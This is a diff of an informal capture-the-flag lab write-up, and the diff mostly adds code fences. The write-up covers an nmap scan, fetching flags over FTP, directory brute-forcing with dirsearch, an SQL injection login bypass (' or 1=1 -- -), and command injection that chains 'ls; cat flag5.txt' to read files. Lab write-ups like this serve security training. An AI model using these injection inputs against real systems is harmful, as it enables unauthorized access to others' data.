@@ -7,7 +7,7 @@ first flag is in a cookie,
 http headers
 
 learned to use inspect network tab, much quicker than burp or zap, 
-
+```basic
  nmap reveals three open ports  
  (kali㉿kali)-[~]
 └─$ nmap 10.10.74.165               
@@ -19,13 +19,13 @@ PORT   STATE SERVICE
 21/tcp open  ftp
 22/tcp open  ssh
 80/tcp open  http
-
+```
 
  
  ftp 
  
  we get flag by downloading file,, from the files directorry , you have to put in passive mode , 
- 
+ ```bash
  ftp> ls
 227 Entering Passive Mode (10,10,74,165,186,35).
 150 Here comes the directory listing.
@@ -43,11 +43,11 @@ mget flag3.txt?
 227 Entering Passive Mode (10,10,74,165,186,38).
 150 Opening BINARY mode data connection for flag3.txt (33 bytes).
 226 Transfer complete.
-
+```
 
 used dirsearch instead of gobuster
 
-                                                                                                                                                                       
+ ```bash                                                                                                                                                                    
 ┌──(kali㉿kali)-[~/dirsearch]
 └─$ python3 dirsearch.py -u http://10.10.74.165    
 /home/kali/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.2) or chardet (4.0.0) doesn't match a supported version!
@@ -76,7 +76,7 @@ Output File: /home/kali/dirsearch/reports/10.10.74.165/_21-05-11_16-03-39.txt
 [16:05:03] 200 -    1KB - /portal
 
 Task Completed
-
+```
 
 the sqli was interesting but you have to add ' or 1=1 -- -  to both user and password 
 
@@ -86,7 +86,7 @@ remote code enumerate linux
 cd ../; ls; cat flag5.txt    had to use less 
 
 the site was really cool,,, 
-
+```html
 <!doctype html>
 <html lang="en">
   <head>
@@ -310,7 +310,7 @@ the site was really cool,,,
     </script>
   </body>
 </html>
-
+```
 
 
 
